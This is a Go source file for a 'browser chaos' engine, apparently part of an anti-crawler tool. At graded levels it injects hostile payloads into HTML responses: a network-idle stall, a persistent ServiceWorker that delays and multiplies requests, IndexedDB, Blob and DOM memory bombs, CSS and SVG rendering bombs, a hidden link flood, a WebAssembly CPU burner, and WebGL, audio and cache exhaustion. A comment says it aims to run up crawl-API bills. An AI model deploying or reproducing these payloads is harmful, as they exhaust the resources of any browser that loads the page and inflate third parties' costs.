package browserchaos

import (
	"crypto/sha256"
	"fmt"
	"math/rand"
	"net/http"
	"strings"
	"sync"
)

// Engine generates browser-targeted chaos payloads that disrupt headless Chrome
// and other browser-based crawlers. Unlike protocol-level chaos (which targets
// HTTP parsers), browser chaos attacks the rendering pipeline, JS runtime,
// and browser resource management.
//
// Levels:
//
//	0 = disabled
//	1 = subtle: network idle stall only (prevents page "complete" detection)
//	2 = moderate: + ServiceWorker poisoning + memory pressure
//	3 = aggressive: + CSS/SVG rendering bombs + WASM CPU burn
//	4 = nightmare: all attacks at maximum intensity
type Engine struct {
	mu      sync.RWMutex
	enabled bool
	level   int // 0-4
}

// NewEngine creates a browser chaos engine (disabled by default).
func NewEngine() *Engine {
	return &Engine{
		enabled: false,
		level:   0,
	}
}

// SetEnabled toggles the engine on/off.
func (e *Engine) SetEnabled(enabled bool) {
	e.mu.Lock()
	e.enabled = enabled
	e.mu.Unlock()
}

// IsEnabled returns whether the engine is active.
func (e *Engine) IsEnabled() bool {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.enabled
}

// SetLevel sets the chaos level (0-4). Values outside range are clamped.
func (e *Engine) SetLevel(level int) {
	if level < 0 {
		level = 0
	}
	if level > 4 {
		level = 4
	}
	e.mu.Lock()
	e.level = level
	e.mu.Unlock()
}

// GetLevel returns the current chaos level.
func (e *Engine) GetLevel() int {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.level
}

// Snapshot returns the engine state for config export.
func (e *Engine) Snapshot() map[string]interface{} {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return map[string]interface{}{
		"enabled": e.enabled,
		"level":   e.level,
	}
}

// Restore applies a config snapshot to the engine.
func (e *Engine) Restore(cfg map[string]interface{}) {
	e.mu.Lock()
	defer e.mu.Unlock()
	if v, ok := cfg["enabled"].(bool); ok {
		e.enabled = v
	}
	if v, ok := cfg["level"].(float64); ok {
		e.level = int(v)
	} else if v, ok := cfg["level"].(int); ok {
		e.level = v
	}
}

// ShouldHandle returns true if the path is a browser chaos endpoint.
func (e *Engine) ShouldHandle(path string) bool {
	return path == "/_bc/sw.js"
}

// ServeHTTP handles browser chaos endpoints (ServiceWorker script).
func (e *Engine) ServeHTTP(w http.ResponseWriter, r *http.Request) int {
	if r.URL.Path == "/_bc/sw.js" {
		e.mu.RLock()
		level := e.level
		e.mu.RUnlock()

		w.Header().Set("Content-Type", "application/javascript")
		w.Header().Set("Service-Worker-Allowed", "/")
		w.Header().Set("Cache-Control", "no-cache")
		w.WriteHeader(http.StatusOK)
		rng := rand.New(rand.NewSource(int64(level * 42)))
		w.Write([]byte(generateSWScript(rng, level)))
		return http.StatusOK
	}
	return http.StatusNotFound
}

// GeneratePayload returns HTML/CSS/JS blocks to inject into HTML responses.
// The output is deterministic per path (seeded from path hash) so the same
// URL always produces the same chaos. Returns empty string if disabled or level=0.
func (e *Engine) GeneratePayload(path string) string {
	e.mu.RLock()
	enabled := e.enabled
	level := e.level
	e.mu.RUnlock()

	if !enabled || level <= 0 {
		return ""
	}

	seed := pathSeed(path)
	rng := rand.New(rand.NewSource(seed))

	var parts []string

	// Level 1+: Network idle stall — prevents networkidle2 detection
	parts = append(parts, generateNetworkIdleStall(rng, level))

	if level >= 2 {
		// Level 2+: ServiceWorker poisoning
		parts = append(parts, generateServiceWorkerPoison(rng, level))
		// Level 2+: Memory accumulation (IndexedDB + Blob leaks)
		parts = append(parts, generateMemoryBomb(rng, level))
	}

	if level >= 3 {
		// Level 3+: CSS rendering bombs
		parts = append(parts, generateCSSBomb(rng, level))
		// Level 3+: Page slot poisoning (link flood)
		parts = append(parts, generateLinkFlood(rng, level))
	}

	if level >= 4 {
		// Level 4: WASM CPU bomb
		parts = append(parts, generateWASMBomb(rng))
		// Level 4: Aggressive resource exhaustion
		parts = append(parts, generateResourceExhaustion(rng))
	}

	return strings.Join(parts, "\n")
}

// pathSeed produces a deterministic int64 from a URL path.
func pathSeed(path string) int64 {
	h := sha256.Sum256([]byte(path))
	var seed int64
	for i := 0; i < 8; i++ {
		seed = (seed << 8) | int64(h[i])
	}
	return seed
}

// generateNetworkIdleStall prevents headless Chrome from detecting "networkidle2"
// (fewer than 2 connections for 500ms). A periodic fetch keeps the network active,
// which stalls Puppeteer/Playwright waitUntil:'networkidle2' indefinitely, burning
// browser-seconds on billing-based crawl APIs (e.g., Cloudflare Browser Rendering).
func generateNetworkIdleStall(rng *rand.Rand, level int) string {
	// Vary the interval based on level — lower = harder to detect idle
	intervals := []int{450, 350, 250, 200}
	interval := intervals[0]
	if level-1 < len(intervals) {
		interval = intervals[level-1]
	}

	// Use multiple concurrent fetches at higher levels
	fetches := 1
	if level >= 3 {
		fetches = 3
	}
	if level >= 4 {
		fetches = 5
	}

	fetchCalls := ""
	for i := 0; i < fetches; i++ {
		endpoint := fmt.Sprintf("/api/v%d/heartbeat?_=%d", rng.Intn(3)+1, rng.Intn(99999))
		fetchCalls += fmt.Sprintf("      fetch('%s',{mode:'no-cors'}).catch(function(){});\n", endpoint)
	}

	// EventSource (SSE) keeps a persistent connection open — counts as active network
	sseEndpoint := fmt.Sprintf("/api/v%d/events?stream=%d", rng.Intn(3)+1, rng.Intn(99999))

	return fmt.Sprintf(`<script>
(function(){
  var _ni=setInterval(function(){
%s  },%d);
  setTimeout(function(){clearInterval(_ni)},%d);
  try{new EventSource('%s')}catch(e){}
  try{var x=new XMLHttpRequest();x.open('GET','/api/v1/stream',true);x.send()}catch(e){}
})();
</script>`, fetchCalls, interval, 55000+rng.Intn(10000), sseEndpoint)
}

// generateServiceWorkerPoison registers a ServiceWorker using a real URL endpoint
// (/_bc/sw.js) served by the handler. Once installed, it persists across page
// navigations in the same browser context, intercepting all fetch/navigation.
// Uses a real URL because headless Chrome blocks Blob URL-based SW registration.
func generateServiceWorkerPoison(rng *rand.Rand, level int) string {
	return fmt.Sprintf(`<script>
(function(){
  if('serviceWorker' in navigator){
    navigator.serviceWorker.register('/_bc/sw.js',{scope:'/'}).then(function(reg){
      if(reg.installing){
        reg.installing.postMessage({cmd:'init',level:%d});
      }
    }).catch(function(){});
  }
})();
</script>`, level)
}

func generateSWScript(rng *rand.Rand, level int) string {
	extraFetches := 2
	delayMs := 100
	if level >= 3 {
		extraFetches = 5
		delayMs = 300
	}
	if level >= 4 {
		extraFetches = 10
		delayMs = 500
	}

	return fmt.Sprintf(`
self.addEventListener('fetch', function(event) {
  // Amplify: make extra background requests per navigation
  for (var i = 0; i < %d; i++) {
    fetch('/api/v1/analytics?_sw=' + Date.now() + '&i=' + i, {mode: 'no-cors'}).catch(function(){});
  }

  // Tarpit: add delay to every request
  event.respondWith(
    new Promise(function(resolve) {
      setTimeout(function() {
        resolve(fetch(event.request));
      }, %d);
    })
  );
});

self.addEventListener('install', function(event) {
  self.skipWaiting();
});

self.addEventListener('activate', function(event) {
  event.waitUntil(self.clients.claim());
});
`, extraFetches, delayMs)
}

// generateMemoryBomb creates JS that accumulates memory across page visits.
// Uses IndexedDB (persistent), Blob URLs (leaked), and detached DOM trees.
func generateMemoryBomb(rng *rand.Rand, level int) string {
	// Size of garbage data per technique (bytes)
	idbSize := 1024 * 512 // 512KB at level 2
	blobCount := 10
	domNodes := 5000

	if level >= 3 {
		idbSize = 1024 * 1024 * 2 // 2MB
		blobCount = 30
		domNodes = 20000
	}
	if level >= 4 {
		idbSize = 1024 * 1024 * 10 // 10MB
		blobCount = 100
		domNodes = 50000
	}

	dbName := fmt.Sprintf("_analytics_%x", rng.Uint32())

	return fmt.Sprintf(`<script>
(function(){
  // IndexedDB bomb: write large blobs that persist across navigations
  var req=indexedDB.open('%s',1);
  req.onupgradeneeded=function(e){
    var db=e.target.result;
    if(!db.objectStoreNames.contains('data')){
      db.createObjectStore('data',{keyPath:'id'});
    }
  };
  req.onsuccess=function(e){
    var db=e.target.result;
    try{
      var tx=db.transaction('data','readwrite');
      var store=tx.objectStore('data');
      var chunk=new Array(%d+1).join('X');
      for(var i=0;i<5;i++){
        store.put({id:Date.now()+'-'+i,payload:chunk});
      }
    }catch(err){}
  };

  // Blob URL leaks: create blobs without revoking URLs
  for(var b=0;b<%d;b++){
    var data=new Array(65537).join('A');
    var bl=new Blob([data],{type:'application/octet-stream'});
    URL.createObjectURL(bl); // deliberately leaked
  }

  // Detached DOM trees: create large subtrees and lose references
  for(var d=0;d<3;d++){
    var container=document.createElement('div');
    for(var n=0;n<%d;n++){
      var el=document.createElement('span');
      el.textContent='data-'+n;
      container.appendChild(el);
    }
    // container goes out of scope but Chrome may not GC immediately
  }
})();
</script>`, dbName, idbSize/5, blobCount, domNodes/3)
}

// generateCSSBomb creates CSS that attacks the rendering pipeline.
// Includes nested calc(), filter stacking, and massive grid layouts.
func generateCSSBomb(rng *rand.Rand, level int) string {
	var parts []string

	// Nested calc() — exponential layout computation
	calcDepth := 30
	if level >= 4 {
		calcDepth = 60
	}
	calcExpr := "100px"
	for i := 0; i < calcDepth; i++ {
		calcExpr = fmt.Sprintf("calc(%s + 1px)", calcExpr)
	}

	// Stacked blur filters
	filterCount := 10
	if level >= 4 {
		filterCount = 30
	}
	filters := make([]string, filterCount)
	for i := range filters {
		filters[i] = fmt.Sprintf("blur(%dpx)", rng.Intn(3)+1)
	}

	// CSS Grid bomb
	gridRepeat := 10000
	if level >= 4 {
		gridRepeat = 99999
	}

	className := fmt.Sprintf("_c%x", rng.Uint32())

	parts = append(parts, fmt.Sprintf(`<style>
.%s-calc{width:%s;height:%s;position:absolute;left:-9999px}
.%s-filter{filter:%s;position:absolute;left:-9999px;width:100px;height:100px}
.%s-grid{display:grid;grid-template-columns:repeat(%d,1fr);position:absolute;left:-9999px}
</style>`, className, calcExpr, calcExpr,
		className, strings.Join(filters, " "),
		className, gridRepeat))

	// Inject elements that use these styles
	parts = append(parts, fmt.Sprintf(`<div class="%s-calc" aria-hidden="true"></div>`, className))
	parts = append(parts, fmt.Sprintf(`<div class="%s-filter" aria-hidden="true"><div style="width:500px;height:500px;background:red"></div></div>`, className))
	parts = append(parts, fmt.Sprintf(`<div class="%s-grid" aria-hidden="true"></div>`, className))

	// SVG recursion bomb (at level 4)
	if level >= 4 {
		parts = append(parts, `<svg style="position:absolute;left:-9999px" width="0" height="0">
<defs>
<filter id="_svgbomb"><feGaussianBlur stdDeviation="5"/><feComposite in="SourceGraphic"/></filter>
<pattern id="_p1" patternUnits="userSpaceOnUse" width="10" height="10"><rect width="10" height="10" filter="url(#_svgbomb)"/></pattern>
</defs>
<rect width="1000" height="1000" fill="url(#_p1)"/>
</svg>`)
	}

	return strings.Join(parts, "\n")
}

// generateLinkFlood creates thousands of invisible links to consume crawl budget.
// Each link points to a unique path, and each path will generate more links,
// creating an exponential crawl graph.
func generateLinkFlood(rng *rand.Rand, level int) string {
	linkCount := 500
	if level >= 4 {
		linkCount = 2000
	}

	var sb strings.Builder
	sb.WriteString(`<div style="position:absolute;left:-9999px;font-size:0;line-height:0" aria-hidden="true">`)
	for i := 0; i < linkCount; i++ {
		path := fmt.Sprintf("/p/%x/%x", rng.Uint32(), rng.Uint32())
		sb.WriteString(fmt.Sprintf(`<a href="%s">page</a>`, path))
	}
	sb.WriteString(`</div>`)
	return sb.String()
}

// generateWASMBomb creates a WebAssembly module that burns CPU.
// WASM execution is harder for Chrome to interrupt than JS.
func generateWASMBomb(rng *rand.Rand) string {
	// Minimal WASM module that runs an expensive loop.
	// This is a valid WASM binary (base64-encoded) that exports a function
	// running ~100M iterations of integer math.
	return `<script>
(function(){
  // WebAssembly CPU burner — runs expensive computation in WASM
  // which is harder for the browser to interrupt than JS
  var wasmBytes = new Uint8Array([
    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00, // magic + version
    0x01,0x05,0x01,0x60,0x00,0x01,0x7f,       // type section: () -> i32
    0x03,0x02,0x01,0x00,                       // function section
    0x07,0x08,0x01,0x04,0x62,0x75,0x72,0x6e,0x00,0x00, // export "burn"
    0x0a,0x17,0x01,0x15,0x01,0x01,0x7f,       // code section
    0x41,0x00,0x21,0x00,                       // local.set 0 = 0
    0x03,0x40,                                 // loop
    0x20,0x00,0x41,0x01,0x6a,0x21,0x00,       //   local.get 0; i32.const 1; i32.add; local.set 0
    0x20,0x00,0x41,0xc0,0x84,0x3d,0x48,       //   local.get 0; i32.const 1000000; i32.lt_s
    0x0d,0x00,                                 //   br_if 0
    0x0b,                                      // end loop
    0x20,0x00,                                 // local.get 0
    0x0b                                       // end function
  ]);
  try{
    var mod=new WebAssembly.Module(wasmBytes);
    var inst=new WebAssembly.Instance(mod);
    // Run repeatedly in microtasks to keep burning
    function burnCycle(){
      for(var i=0;i<50;i++) inst.exports.burn();
      setTimeout(burnCycle, 10);
    }
    burnCycle();
  }catch(e){}
})();
</script>`
}

// generateResourceExhaustion creates multiple attack vectors that exhaust
// browser resources: WebGL contexts, audio contexts, and canvas elements.
func generateResourceExhaustion(rng *rand.Rand) string {
	return `<script>
(function(){
  // WebGL context exhaustion (Chrome limits ~16 contexts per process)
  for(var i=0;i<20;i++){
    var c=document.createElement('canvas');
    c.width=1;c.height=1;
    try{c.getContext('webgl2')||c.getContext('webgl')}catch(e){}
  }

  // AudioContext accumulation
  for(var a=0;a<10;a++){
    try{
      var ctx=new (window.AudioContext||window.webkitAudioContext)();
      var osc=ctx.createOscillator();
      var gain=ctx.createGain();
      gain.gain.value=0;
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      // deliberately not stopped — accumulates audio processing load
    }catch(e){}
  }

  // Cache API pollution
  if('caches' in self){
    caches.open('_bc_'+Date.now()).then(function(cache){
      var big=new Array(1048577).join('Z');
      for(var i=0;i<20;i++){
        cache.put(new Request('/_cache/'+i+'?t='+Date.now()),
          new Response(big,{headers:{'Content-Type':'application/octet-stream'}}));
      }
    }).catch(function(){});
  }
})();
</script>`
}

// jsStringLiteral wraps a string as a JS string literal (single-quoted, escaped).
func jsStringLiteral(s string) string {
	s = strings.ReplaceAll(s, "\\", "\\\\")
	s = strings.ReplaceAll(s, "'", "\\'")
	s = strings.ReplaceAll(s, "\n", "\\n")
	s = strings.ReplaceAll(s, "\r", "\\r")
	return "'" + s + "'"
}
